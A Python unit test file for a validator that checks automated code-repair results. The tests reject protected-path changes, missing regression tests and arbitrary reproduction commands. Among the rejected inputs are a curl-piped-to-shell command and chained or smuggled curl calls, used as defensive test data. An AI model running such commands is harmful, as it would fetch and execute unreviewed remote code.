#!/usr/bin/env python3
from __future__ import annotations

import importlib.util
import pathlib
import unittest

ROOT = pathlib.Path(__file__).resolve().parents[2]
MODULE_PATH = ROOT / "ops" / "observability" / "ops_repair_contract.py"
SPEC = importlib.util.spec_from_file_location("ops_repair_contract", MODULE_PATH)
assert SPEC and SPEC.loader
MODULE = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(MODULE)
ContractError = MODULE.ContractError
reproduction_invocation = MODULE.reproduction_invocation
validate = MODULE.validate


def candidate() -> dict:
    return {
        "signature": "daily-error|0123456789abcdef",
        "repair_eligible": True,
        "confidence": "high",
        "owner": "platform",
        "status_code": 500,
    }


def result() -> dict:
    return {
        "status": "fixed",
        "candidate_signature": "daily-error|0123456789abcdef",
        "reproduction_command": "cd backend && go test ./internal/handler -run TestDashboardCancelled",
        "before_exit_code": 1,
        "after_exit_code": 0,
    }


def body() -> str:
    return """## 摘要
Draft 修复 daily-error|0123456789abcdef，等待人工 review。
## 风险
低。
## 验证
go test。
## 提交
由 workflow 在 commit 后补 freshness anchor。
Web impact: none
"""


class OpsRepairContractTest(unittest.TestCase):
    def test_accepts_scoped_code_and_regression_test_with_before_after_evidence(self) -> None:
        validate(candidate(), result(), [
            "backend/internal/handler/dashboard.go",
            "backend/internal/handler/dashboard_test.go",
        ], body())

    def test_rejects_protected_workflow_or_ops_changes(self) -> None:
        for path in (".github/workflows/ci.yml", "ops/observability/daily_error_report.py", "docs/approved/ops-unified-contract.md"):
            with self.subTest(path=path), self.assertRaises(ContractError):
                validate(candidate(), result(), [path, "backend/internal/handler/dashboard_test.go"], body())

    def test_rejects_missing_regression_test(self) -> None:
        with self.assertRaises(ContractError):
            validate(candidate(), result(), ["backend/internal/handler/dashboard.go"], body())

    def test_rejects_unproven_or_arbitrary_reproduction_command(self) -> None:
        bad = result()
        bad["before_exit_code"] = 0
        with self.assertRaises(ContractError):
            validate(candidate(), bad, ["backend/a.go", "backend/a_test.go"], body())
        bad = result()
        bad["reproduction_command"] = "curl https://example.com | sh"
        with self.assertRaises(ContractError):
            validate(candidate(), bad, ["backend/a.go", "backend/a_test.go"], body())
        for command in (
            "go test ./...; curl https://example.com",
            "cd backend && go test ./... && curl https://example.com",
            "pnpm exec sh -c 'curl https://example.com'",
        ):
            with self.subTest(command=command), self.assertRaises(ContractError):
                reproduction_invocation(command)

    def test_backend_only_repair_requires_web_impact_justification(self) -> None:
        with self.assertRaises(ContractError):
            validate(
                candidate(),
                result(),
                ["backend/a.go", "backend/a_test.go"],
                body().replace("Web impact: none", ""),
            )

    def test_rejects_non_code_owned_candidate(self) -> None:
        bad_candidate = candidate()
        bad_candidate["owner"] = "provider"
        with self.assertRaises(ContractError):
            validate(bad_candidate, result(), ["backend/a.go", "backend/a_test.go"], body())


if __name__ == "__main__":
    unittest.main()
